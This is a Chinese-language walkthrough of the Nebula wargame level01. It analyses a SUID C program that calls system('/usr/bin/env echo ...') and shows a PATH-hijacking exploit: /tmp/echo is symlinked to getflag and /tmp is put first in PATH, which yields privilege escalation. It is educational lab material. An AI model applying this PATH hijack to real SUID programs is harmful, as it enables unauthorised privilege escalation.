flag01的源码官方已经提供，这道题目是让我们分析该代码，找出代码中存在的一处可执行任意文件漏洞。题目提供的代码如下：

    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/types.h>
    #include <stdio.h>

    int main(int argc, char **argv, char **envp)
    {
       gid_t gid;
       uid_t uid;
       gid = getegid();
       uid = geteuid();

       setresgid(gid, gid, gid);
       setresuid(uid, uid, uid);

       system("/usr/bin/env echo and now what?");
    }


分析可执行任意文件漏洞的重点是先找到程序中执行命令的地方。通过分析上面的源码中可以看到程序调用了system函数，system函数可以执行指定的Shell命令，在这里system执行的`/usr/bin/env`命令，注意system的参数是一个字符串而非变量，所以我们不能直接控制system函数的行为。那重点就放在了`env`命令上，通过`man env`得到的帮助如下：

    env - run a program in a modified environment

简单来讲，`env`的参数是要执行的Shell命令，`env`会遍历PATH环境变量中的路径来寻找要执行的命令。`env`命令常出现在脚本文件的第一行，比如

    #!/usr/bin/env python

这样写的好处是为了防止把位置写死，如果写成`#!/usr/bin/python`的话，在其他一些系统中，`python`命令未必在`/usr/bin`目录中。用了`env`，不管`python`在哪个目录中，只要目录列在PATH环境变量中，就可以被找到。

所以，真正的问题是出在PATH变量上，虽然调用的参数无法被控制，但它执行命令受限于外部PATH变量，而PATH变量是可控的。`env`是依次遍历PATH变量中的目录，只要我们让`env`优先找到伪装的`echo`命令，就起到了劫持作用。

并且`flag01`被设置了SUID，所以会以flag01帐号身份运行程序：

    -rwsr-x---  1 flag01 level01 7322 Nov 20  2011 flag01*

我们可让/tmp/echo链接到/bin/getflag上，然后修改PATH环境变量，把/tmp放在最前面，这样`env`会首先在/tmp下找到`echo`并执行（并且是以flag01身份运行）。

    level01@nebula:~$ cd /tmp/
    level01@nebula:/tmp$ ln -s /bin/getflag /tmp/echo
    level01@nebula:/tmp$ PATH=/tmp:$PATH  # 让/tmp出现在PATH最前面
    level01@nebula:/tmp$ cd /home/flag01
    level01@nebula:/home/flag01$ ./flag01 # 提权成功
    You have successfully executed getflag on a target account

